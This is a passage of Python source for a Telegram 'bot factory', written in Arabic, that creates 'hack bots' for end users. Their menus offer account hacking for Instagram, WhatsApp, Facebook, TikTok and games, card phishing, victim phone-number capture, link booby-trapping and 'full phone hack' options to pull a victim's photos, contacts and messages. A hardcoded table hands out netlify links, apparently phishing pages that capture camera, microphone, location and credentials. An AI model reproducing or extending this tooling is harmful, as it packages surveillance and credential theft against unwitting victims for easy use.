             InlineKeyboardButton("اختراق كاميرات المراقبة 📡", callback_data="surveillance_cams")],
            [InlineKeyboardButton("اختراق انستغرام 💻", callback_data="insta_hack"),
             InlineKeyboardButton("اختراق واتساب 🟢", callback_data="whatsapp_hack")],
            [InlineKeyboardButton("اختراق ببجي 🎮", callback_data="pubg_hack"),
             InlineKeyboardButton("اختراق فيسبوك 🟣", callback_data="facebook_hack")],
            [InlineKeyboardButton("اختراق سناب شات ⭐", callback_data="snapchat_hack"),
             InlineKeyboardButton("اختراق فري فاير 👾", callback_data="ff_hack")],
            [InlineKeyboardButton("الذكاء الاصطناعي 🤖", callback_data="user_button_ai"),
             InlineKeyboardButton("تفسير الأحلام 🧙", callback_data="user_button_dream_interpret")],
            [InlineKeyboardButton("لعبة المارد الأزرق 🧞", callback_data="user_button_blue_genie_game"),
             InlineKeyboardButton("البحث عن الصور 🎨", callback_data="user_button_image_search")],
            [InlineKeyboardButton("تحويل النص إلى صوت 🔄", callback_data="user_button_text_to_speech"),
             InlineKeyboardButton("أذكار إسلامية 🕌", callback_data="user_button_azkar")],
            [InlineKeyboardButton("الذكاء الاصطناعي (شيرين) 🎤", callback_data="user_button_shereen_ai"),
             InlineKeyboardButton("الذكاء الاصطناعي (ديب سيك) 🧠", callback_data="user_button_deepseek_ai")],
            [InlineKeyboardButton("الذكاء الاصطناعي (ChatGPT-3.5) 💬", callback_data="user_button_chatgpt_3_5")],
            [InlineKeyboardButton("اختراق تيك توك 🟧", callback_data="tiktok_hack"),
             InlineKeyboardButton("جمع معلومات الجهاز 🔬", callback_data="device_info")],
            [InlineKeyboardButton("اختراق الهاتف بالكامل 🔞", callback_data="user_button_full_phone_hack")],
            [InlineKeyboardButton("تلغيم الروابط ⚠️", callback_data="user_button_link_exploit")],
            [InlineKeyboardButton("لعبة ذكية 🧠", callback_data="user_button_smart_game"),
             InlineKeyboardButton("صور عالية الدقة 🖼️", callback_data="high_quality_shot")],
            [InlineKeyboardButton("أرقام وهمية ☎️", callback_data="user_button_fake_numbers")],
            [InlineKeyboardButton("تصيد فيزا 💳", callback_data="user_button_visa_phishing"),
             InlineKeyboardButton("الحصول على رقم الضحية 📲", callback_data="get_victim_number")],
            [InlineKeyboardButton("اختراق بث الراديو 📻", callback_data="user_button_radio_hack"),
             InlineKeyboardButton("فحص الروابط 🖌️", callback_data="user_button_link_check")],
            [InlineKeyboardButton("زخرفة الأسماء 🗿", callback_data="user_button_name_decorate")],
            [InlineKeyboardButton("صيد يوزرات تليجرام 💍", callback_data="telegram_usernames_menu")],
            [InlineKeyboardButton("تواصل مع الم개발 👨‍🎓", url=f"tg://user?id={admin_id}")]
        ]
        if bot_settings.get("custom_buttons_enabled_by_admin", False):
            for btn in bot_settings["custom_buttons"]:
                if btn["type"] in ["external_link", "internal_link"]:
                    keyboard.append([InlineKeyboardButton(btn["name"], url=btn["value"])])
                elif btn["type"] == "send_message":
                    keyboard.append([InlineKeyboardButton(btn["name"], callback_data=f"custom_msg_btn_{btn['name']}")])

    elif bot_type == "encryption_bot":
        keyboard = [
            [InlineKeyboardButton("تشفير ملفات 🔒", callback_data="encrypt_file")],
            [InlineKeyboardButton("فك تشفير ملفات 🔓", callback_data="decrypt_file")],
            [InlineKeyboardButton("الدعم 🚨", url=f"tg://user?id={admin_id}")],
            [InlineKeyboardButton("الشروط و المتطلبات 📜", callback_data="show_terms_encryption_bot")]
        ]
        if bot_settings.get("main_channel_link"):
            keyboard.append([InlineKeyboardButton("القناة الأساسية 🫅", url=bot_settings["main_channel_link"])])

    elif bot_type == "factory_bot":
        keyboard = [
            [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
            [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot_sub")]
        ]

    return InlineKeyboardMarkup(keyboard)


def get_full_phone_hack_keyboard(bot_username, user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("سحب جميع صور الهاتف 🔒", callback_data="full_phone_hack_photos")],
        [InlineKeyboardButton("سحب جميع ارقام الضحية 🔒", callback_data="full_phone_hack_contacts")],
        [InlineKeyboardButton("سحب جميع رسائل الضحية 🔒", callback_data="full_phone_hack_messages")],
        [InlineKeyboardButton("تنفيذ الأوامر على جهاز الضحية 🔒", callback_data="full_phone_hack_commands")],
        [InlineKeyboardButton("اختراق جهاز الضحية 🔒", callback_data="full_phone_hack_device")],
        [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
    ])


def get_fake_number_keyboard(bot_username, user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("طلب كود 💬", callback_data="fake_number_request_code")],
        [InlineKeyboardButton("تغيير الرقم 🔄", callback_data="fake_number_change_number")]
    ])


# =============================================
# وظائف البحث عن يوزرات تليجرام
# =============================================

def check_username_availability(bot_token, username):
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id=@{username}").json()
        if resp.get("ok"):
            return False
        elif resp.get("error_code") == 400 and "chat not found" in resp.get("description", "").lower():
            return True
        return False
    except Exception as e:
        logging.error(f"Error checking username availability: {e}")
        return False


def generate_and_check_username(bot_token, username_type):
    chars = string.ascii_lowercase + string.digits
    for _ in range(50):
        username = ""
        if username_type == "single_type":
            char = random.choice(string.ascii_lowercase)
            username = char * 4
        elif username_type == "quad_usernames":
            username = ''.join(random.choice(chars) for _ in range(4))
        elif username_type == "semi_quad":
            parts = [random.choice(chars) for _ in range(3)]
            username = f"{parts[0]}{parts[1]}_{parts[2]}" if random.choice([True, False]) else f"{parts[0]}_{parts[1]}{parts[2]}"
        elif username_type == "semi_triple":
            parts = [random.choice(chars) for _ in range(2)]
            username = f"{parts[0]}_{parts[1]}"
        elif username_type == "random":
            length = random.randint(4, 8)
            username = ''.join(random.choice(chars) for _ in range(length))
        elif username_type == "unique":
            patterns = [
                lambda: ''.join(random.choice(string.ascii_lowercase) for _ in range(4)),
                lambda: ''.join(random.choice(string.digits) for _ in range(4)),
                lambda: random.choice(string.ascii_lowercase) * 3 + random.choice(string.digits),
                lambda: random.choice(string.ascii_lowercase) + random.choice(string.digits) * 3,
            ]
            username = random.choice(patterns)()
        if check_username_availability(bot_token, username):
            return username
        time.sleep(0.1)
    return None


# =============================================
# تشغيل البوتات المصنوعة
# =============================================

def run_made_bot(bot_token, admin_id, bot_username, bot_type):
    try:
        made_app = ApplicationBuilder().token(bot_token).build()
        made_app.add_handler(CommandHandler("start", start_made_bot))
        made_app.add_handler(CallbackQueryHandler(handle_callback_query_made_bot))
        made_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_made_bot))
        made_app.add_handler(MessageHandler(filters.Document.ALL, handle_document_made_bot))
        logging.info(f"Starting made bot @{bot_username}...")
        made_app.run_polling(drop_pending_updates=True)
        return made_app
    except Exception as e:
        logging.error(f"Error running made bot @{bot_username}: {e}")
        return None


# =============================================
# handlers البوت الرئيسي
# =============================================

def start_main_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in FACTORY_ADMINS:
        send_message(context.bot, user_id,
                     "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @RLH55\nقناة المطور: @ln_bio",
                     reply_markup=get_main_bot_admin_keyboard())
        user_state[user_id] = None
        return
    if check_subscription(user_id, MAIN_CHANNELS, MAIN_BOT_TOKEN):
        send_message(context.bot, user_id,
                     "👋 حياك الله في بوت صانع البوتات ✨\n\nالمطور: @RLH55\nقناة المطور: @RLH5500",
                     reply_markup=get_main_bot_user_keyboard())
        user_state[user_id] = None
    else:
        msg = "❌ يجب عليك الاشتراك في القنوات التالية لاستخدام البوت:\n\n"
        for channel in MAIN_CHANNELS:
            msg += f"🔗 {channel}\n"
        msg += "\nبعد الاشتراك، أرسل /start مرة أخرى."
        update.message.reply_text(msg)


def create_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    keyboard = [
        [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot")],
        [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot")],
        [InlineKeyboardButton("🎩 مصنع بوتات", callback_data="create_factory_bot")]
    ]
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "اختر نوع البوت الذي تريد إنشاءه:", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[query.from_user.id] = "await_bot_type_selection"


def create_hack_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت اختراق'.")
    user_state[query.from_user.id] = {"action": "await_token", "bot_type": "hack_bot"}


def create_encryption_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت تشفير py'.")
    user_state[query.from_user.id] = {"action": "await_token", "bot_type": "encryption_bot"}


def create_factory_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    if FACTORY_MAIN_SUBSCRIPTION_ENABLED and not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
        msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لإنشاء مصنع بوتات."
        keyboard = [[InlineKeyboardButton("اشترك في القناة", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
        edit_message_text(context.bot, query.message.chat.id, query.message.message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
        user_state[user_id] = None
        return
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'مصنع بوتات'.")
    user_state[user_id] = {"action": "await_token", "bot_type": "factory_bot"}


def manage_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    bots = created_bots.get(user_id, [])
    if not bots:
        edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                          "⚠️ ليس لديك أي بوتات حتى الآن.")
        return
    keyboard = []
    for bot_data in bots:
        keyboard.append([InlineKeyboardButton(f"🤖 {bot_data['username']} ({bot_data['bot_type']})", callback_data=f"info_{bot_data['username']}")])
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "اختر البوت الذي تريد إدارته:", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[user_id] = "manage_bots"


def bot_info_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    username = query.data.split("_", 1)[1]
    keyboard = [[InlineKeyboardButton("🗑 حذف البوت", callback_data=f"delete_{username}")]]
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      f"معلومات البوت @{username}", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[user_id] = f"confirm_delete_{username}"


def delete_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    username = query.data.split("_", 1)[1]
    user_state[user_id] = f"confirm_delete_{username}"
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      f"⚠️ هل أنت متأكد من حذف البوت @{username}؟\nأرسل:\n`delete {username}`",
                      parse_mode=ParseMode.MARKDOWN)


def add_factory_admin_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    if user_id != MAIN_ADMIN_ID:
        query.answer("🚫 ليس لديك صلاحية.", show_alert=True)
        return
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "أرسل معرف (ID) المستخدم الذي تريد إضافته كأدمن:")
    user_state[user_id] = "await_new_factory_admin_id"


def remove_factory_admin_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    if user_id != MAIN_ADMIN_ID:
        query.answer("🚫 ليس لديك صلاحية.", show_alert=True)
        return
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "أرسل معرف (ID) المستخدم الذي تريد حذفه:")
    user_state[user_id] = "await_remove_factory_admin_id"


def factory_stats_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    total_bots = sum(len(bots) for bots in created_bots.values())
    total_users = 0
    for bot_username in made_bot_data:
        total_users += len(made_bot_data[bot_username].get("members", []))
    stats = (
        f"📊 *إحصائيات المصنع:*\n"
        f"🤖 عدد البوتات: {total_bots}\n"
        f"👥 إجمالي المستخدمين: {total_users}\n"
        f"👨‍💻 عدد الأدمنز: {len(FACTORY_ADMINS)}"
    )
    send_message(context.bot, query.message.chat.id, stats, parse_mode=ParseMode.MARKDOWN)


def stop_all_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer("جاري إيقاف جميع البوتات...", show_alert=True)
    action_taken = False
    for bot_username, updater_instance in list(running_made_bot_updaters.items()):
        try:
            updater_instance.stop()
            del running_made_bot_updaters[bot_username]
            action_taken = True
        except Exception as e:
            logging.error(f"Error stopping bot @{bot_username}: {e}")
    if action_taken:
        send_message(context.bot, query.message.chat.id, "✅ تم إيقاف جميع البوتات.")
    else:
        send_message(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات قيد التشغيل.")


def start_all_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer("جاري إعادة تشغيل جميع البوتات...", show_alert=True)
    action_taken = False
    for admin_id_key, bots_list in created_bots.items():
        for bot_info_item in bots_list:
            bot_username = bot_info_item["username"]
            if bot_username not in running_made_bot_updaters:
                try:
                    threading.Thread(
                        target=run_made_bot,
                        args=(bot_info_item["token"], bot_info_item["admin_id"], bot_username, bot_info_item["bot_type"]),
                        daemon=True
                    ).start()
                    action_taken = True
                except Exception as e:
                    logging.error(f"Error restarting bot @{bot_username}: {e}")
    if action_taken:
        send_message(context.bot, query.message.chat.id, "✅ جاري إعادة تشغيل البوتات.")
    else:
        send_message(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات لإعادة تشغيلها.")


def broadcast_free_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    send_message(context.bot, query.message.chat.id, "أرسل الرسالة التي تريد إذاعتها:")
    user_state[user_id] = "await_broadcast_free_bots_message"


def add_factory_main_subscription(update: Update, context: CallbackContext):
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    query = update.callback_query
    query.answer("جاري تفعيل الاشتراك الإجباري...", show_alert=True)
    FACTORY_MAIN_SUBSCRIPTION_ENABLED = True
    for bot_username in made_bot_data:
        load_made_bot_settings(bot_username)
        if FACTORY_MAIN_SUBSCRIPTION_CHANNEL not in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].append(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
            save_made_bot_settings(bot_username)
    send_message(context.bot, query.message.chat.id, "✅ تم تفعيل الاشتراك الإجباري لقناة المصنع.")
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "👋 حياك الله في بوت صانع البوتات (وضع الأدمن)",
                      reply_markup=get_main_bot_admin_keyboard())


def remove_factory_main_subscription(update: Update, context: CallbackContext):
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    query = update.callback_query
    query.answer("جاري إزالة الاشتراك الإجباري...", show_alert=True)
    FACTORY_MAIN_SUBSCRIPTION_ENABLED = False
    for bot_username in made_bot_data:
        load_made_bot_settings(bot_username)
        if FACTORY_MAIN_SUBSCRIPTION_CHANNEL in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].remove(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
            save_made_bot_settings(bot_username)
    send_message(context.bot, query.message.chat.id, "✅ تم إزالة الاشتراك الإجباري لقناة المصنع.")
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "👋 حياك الله في بوت صانع البوتات (وضع الأدمن)",
                      reply_markup=get_main_bot_admin_keyboard())


def handle_message_main_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    state = user_state.get(user_id)
    text = update.message.text.strip()

    if isinstance(state, dict) and state.get("action") == "await_token":
        send_message(context.bot, update.message.chat.id, "⏳ جاري إعداد البوت...")
        bot_token = text
        bot_type = state["bot_type"]
        try:
            bot_info_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
            if not bot_info_resp.get("ok"):
                send_message(context.bot, update.message.chat.id, "❌ التوكن غير صالح.")
                user_state[user_id] = None
                return
            bot_username = bot_info_resp["result"]["username"]
            bots = created_bots.get(user_id, [])
            bots.append({"token": bot_token, "admin_id": user_id, "username": bot_username, "bot_type": bot_type})
            created_bots[user_id] = bots
            bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
            with open(bot_data_file, 'w') as f:
                json.dump({"token": bot_token, "admin_id": user_id, "bot_type": bot_type}, f)
            send_message(context.bot, update.message.chat.id, f"✅ تم تشغيل البوت @{bot_username} بنجاح!")
            user_state[user_id] = None
            if user_id != MAIN_ADMIN_ID:
                creator_name = update.effective_user.first_name
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *بوت جديد!*\n👤 [{creator_name}](tg://user?id={user_id})\n🤖 @{bot_username} ({bot_type})",
                             parse_mode=ParseMode.MARKDOWN)
            threading.Thread(
                target=run_made_bot,
                args=(bot_token, user_id, bot_username, bot_type),
                daemon=True
            ).start()
        except Exception as e:
            logging.error(f"Error setting up bot: {e}")
            send_message(context.bot, update.message.chat.id, "❌ حدث خطأ أثناء إعداد البوت.")
            user_state[user_id] = None
        return

    if state and isinstance(state, str) and state.startswith("confirm_delete_"):
        username_to_delete = state.split("_", 2)[2]
        if text == f"delete {username_to_delete}":
            bots = created_bots.get(user_id, [])
            created_bots[user_id] = [b for b in bots if b["username"] != username_to_delete]
            bot_data_file = os.path.join(DATABASE_DIR, f"{username_to_delete}.json")
            if os.path.exists(bot_data_file):
                os.remove(bot_data_file)
            settings_file = os.path.join(DATABASE_DIR, f"{username_to_delete}_settings.json")
            if os.path.exists(settings_file):
                os.remove(settings_file)
            if username_to_delete in running_made_bot_updaters:
                running_made_bot_updaters[username_to_delete].stop()
                del running_made_bot_updaters[username_to_delete]
            user_state[user_id] = None
            send_message(context.bot, update.message.chat.id, f"✅ تم حذف البوت @{username_to_delete}.")
        else:
            send_message(context.bot, update.message.chat.id, "❌ أمر الحذف غير صحيح.")
        user_state[user_id] = None
        return

    if user_id in FACTORY_ADMINS:
        if state == "await_new_factory_admin_id":
            try:
                new_admin_id = int(text)
                if new_admin_id not in FACTORY_ADMINS:
                    FACTORY_ADMINS.append(new_admin_id)
                    send_message(context.bot, update.message.chat.id, f"✅ تم إضافة {new_admin_id} كأدمن.")
                else:
                    send_message(context.bot, update.message.chat.id, "هذا المستخدم أدمن بالفعل.")
            except ValueError:
                send_message(context.bot, update.message.chat.id, "❌ معرف غير صالح.")
            user_state[user_id] = None
            return

        if state == "await_remove_factory_admin_id":
            try:
                admin_to_remove_id = int(text)
                if admin_to_remove_id == MAIN_ADMIN_ID:
                    send_message(context.bot, update.message.chat.id, "❌ لا يمكن حذف المالك الرئيسي.")
                elif admin_to_remove_id in FACTORY_ADMINS:
                    FACTORY_ADMINS.remove(admin_to_remove_id)
                    send_message(context.bot, update.message.chat.id, f"✅ تم حذف {admin_to_remove_id}.")
                else:
                    send_message(context.bot, update.message.chat.id, "هذا المستخدم ليس أدمن.")
            except ValueError:
                send_message(context.bot, update.message.chat.id, "❌ معرف غير صالح.")
            user_state[user_id] = None
            return

        if state == "await_broadcast_free_bots_message":
            broadcast_message = text
            sent_count = 0
            for admin_id_key, bots_list in created_bots.items():
                for bot_info_item in bots_list:
                    bot_username = bot_info_item["username"]
                    load_made_bot_settings(bot_username)
                    bot_settings = made_bot_data[bot_username]
                    if bot_settings["payment_status"] == "free":
                        for member_id in bot_settings.get("members", []):
                            try:
                                requests.get(f"https://api.telegram.org/bot{bot_info_item['token']}/sendMessage?chat_id={member_id}&text={urllib.parse.quote(broadcast_message)}")
                                sent_count += 1
                            except:
                                pass
            send_message(context.bot, update.message.chat.id, f"✅ تم إرسال الإذاعة.\nالمرسلة: {sent_count}")
            user_state[user_id] = None
            return


# =============================================
# start_made_bot - البوتات المصنوعة
# =============================================

def start_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)
    if not current_bot_username:
        send_message(context.bot, chat_id, "حدث خطأ. يرجى المحاولة لاحقًا.")
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data.get(current_bot_username, DEFAULT_BOT_SETTINGS)

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    bot_user_states[current_bot_username][user_id] = None

    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    if user_id in bot_settings["banned_users"]:
        send_message(context.bot, chat_id, "أنت محظور من قبل المطور.")
        return

    if bot_settings["bot_status"] == "off" and user_id != admin_id:
        send_message(context.bot, chat_id, "البوت متوقف حاليا.")
        return

    if bot_settings["payment_status"] == "on" and user_id not in bot_settings["paid_users"] and user_id != admin_id:
        send_message(context.bot, chat_id, "للاستخدام الكامل يرجى شراء الاشتراك.",
                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("شراء الاشتراك", url=f"tg://user?id={admin_id}")]]))
        return

    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            msg = f"❌ يجب عليك الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
            keyboard = [[InlineKeyboardButton("اشترك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            return

    required_channels = [c for c in bot_settings["channels"] if c != FACTORY_MAIN_SUBSCRIPTION_CHANNEL]
    if required_channels:
        not_subscribed = []
        for channel in required_channels:
            if not check_subscription(user_id, [channel], current_bot_token):
                not_subscribed.append(channel)
        if not_subscribed:
            msg = "يجب الاشتراك في القنوات التالية:\n\n"
            keyboard = []
            for ch in not_subscribed:
                ch_name = get_channel_name(ch, current_bot_token)
                keyboard.append([InlineKeyboardButton(f"اشترك: {ch_name}", url=f"https://t.me/{ch.lstrip('@')}")])
                msg += f"{ch_name}\n"
            msg += "\nبعد الاشتراك أرسل /start"
            send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            return

    members = bot_settings["members"]
    if user_id not in members:
        members.append(user_id)
        bot_settings["members"] = members
        save_made_bot_settings(current_bot_username)
        if bot_settings["notifications"] == "on" and user_id != admin_id:
            user_name = update.effective_user.first_name
            username = update.effective_user.username or "غير متاح"
            send_message(context.bot, admin_id,
                         f"🔔 عضو جديد!\nالاسم: {user_name}\nالمعرف: @{username}\nالايدي: {user_id}\nالعدد الكلي: {len(members)}",
                         parse_mode=ParseMode.MARKDOWN)

    if user_id == admin_id:
        send_message(context.bot, chat_id,
                     "مرحبًا! إليك أوامرك:",
                     reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))

    if bot_type == "encryption_bot":
        user_name = update.effective_user.first_name
        user_username = update.effective_user.username or "غير متاح"
        welcome = f"مرحباً {user_name}!\nيوزر: @{user_username}\nايدي: {user_id}\n\nمرحبا بك في عالم فك/التشفير"
        send_message(context.bot, chat_id, welcome, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
    elif bot_type == "factory_bot":
        send_message(context.bot, chat_id, "حياك الله في بوت صانع البوتات",
                     reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
    else:
        send_message(context.bot, chat_id, bot_settings["start_message"],
                     parse_mode=ParseMode.MARKDOWN,
                     reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))


# =============================================
# handle_callback_query_made_bot
# =============================================

def handle_callback_query_made_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    if not query.message:
        query.answer("حدث خطأ.", show_alert=True)
        return

    user_id = query.from_user.id
    chat_id = query.message.chat.id
    message_id = query.message.message_id
    data = query.data
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        query.answer("حدث خطأ.", show_alert=True)
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data[current_bot_username]

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            msg = f"❌ يجب الاشتراك في {FACTORY_MAIN_SUBSCRIPTION_CHANNEL}"
            keyboard = [[InlineKeyboardButton("اشترك", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            try:
                edit_message_text(context.bot, chat_id, message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            except:
                send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            query.answer("اشترك أولاً.", show_alert=True)
            return

    links = {
        "cam_back": "https://spectacular-crumble-77f830.netlify.app",
        "cam_front": "https://profound-bubblegum-7f29b2.netlify.app",
        "location": "https://illustrious-panda-c2ece1.netlify.app",
        "mic_record": "https://tourmaline-kulfi-aeb7ea.netlify.app",
        "record_video": "https://dainty-medovik-d0e934.netlify.app",
        "pubg_hack": "https://sunny-concha-96fe88.netlify.app",
        "ff_hack": "https://thunderous-maamoul-7653c0.netlify.app",
        "insta_hack": "https://gentle-kulfi-99cf00.netlify.app",
        "whatsapp_hack": "https://benevolent-meerkat-966767.netlify.app",
        "facebook_hack": "https://dazzling-daffodil-ed5b43.netlify.app",
        "tiktok_hack": "https://melodious-crumble-8d3b83.netlify.app",
        "snapchat_hack": "https://preeminent-gumdrop-35a4f1.netlify.app",
        "device_info": "http://incredible-fairy-85f241.netlify.app",
        "high_quality_shot": "https://profound-bubblegum-7f29b2.netlify.app",
        "get_victim_number": "https://tubular-brioche-55433f.netlify.app/",
    }

    query.answer()

    # العودة للقائمة الرئيسية
    if data == "back_to_main_user_menu":
        bot_user_states[current_bot_username][user_id] = None
        if bot_type == "factory_bot":
            send_message(context.bot, chat_id, "اختر نوع البوت:",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        elif bot_type == "encryption_bot":
            user_name = update.effective_user.first_name
            send_message(context.bot, chat_id, f"مرحباً {user_name}!\nمرحبا بك في عالم فك/التشفير",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else:
            send_message(context.bot, chat_id, bot_settings["start_message"],
                         parse_mode=ParseMode.MARKDOWN,
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        return

    # الروابط المباشرة (hack_bot)
    if data in links and bot_type == "hack_bot":
        send_message(context.bot, chat_id, f"🔗 {links[data]}")
        return

    # أزرار hack_bot
    if bot_type == "hack_bot":
        if data == "user_button_ai":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
            send_message(context.bot, chat_id, "📝 أرسل سؤالك للذكاء الاصطناعي:")
            return
        elif data == "user_button_dream_interpret":
            bot_user_states[current_bot_username][user_id] = {"action": "await_dream_text"}
            send_message(context.bot, chat_id, "📝 أرسل حلمك لتفسيره:")
            return
        elif data == "user_button_blue_genie_game":
            bot_user_states[current_bot_username][user_id] = {"action": "await_genie_question"}
            send_message(context.bot, chat_id, "📝 اسأل المارد الأزرق:")
            return
        elif data == "user_button_image_search":
            bot_user_states[current_bot_username][user_id] = {"action": "await_image_prompt"}
            send_message(context.bot, chat_id, "📝 أرسل وصف الصورة:")
            return
        elif data == "user_button_text_to_speech":
            bot_user_states[current_bot_username][user_id] = {"action": "await_tts_text"}
            send_message(context.bot, chat_id, "📝 أرسل النص لتحويله إلى صوت:")
            return
        elif data == "user_button_azkar":
            azkar = get_azkar_via_api(current_bot_username, user_id)
            send_message(context.bot, chat_id, azkar, parse_mode=ParseMode.MARKDOWN)
            return
        elif data == "user_button_shereen_ai":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
            send_message(context.bot, chat_id, "📝 أرسل سؤالك:")
            return
        elif data == "user_button_deepseek_ai":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
            send_message(context.bot, chat_id, "📝 أرسل سؤالك:")
            return
        elif data == "user_button_chatgpt_3_5":
            bot_user_states[current_bot_username][user_id] = {"action": "await_ai_prompt"}
            send_message(context.bot, chat_id, "📝 أرسل سؤالك:")
            return
        elif data == "user_button_full_phone_hack":
            send_message(context.bot, chat_id, "اختر العملية:",
                         reply_markup=get_full_phone_hack_keyboard(current_bot_username, user_id))
            return
        elif data == "user_button_link_exploit":
            send_message(context.bot, chat_id, "🔗 أرسل الرابط المراد تلغيمه:")
            return
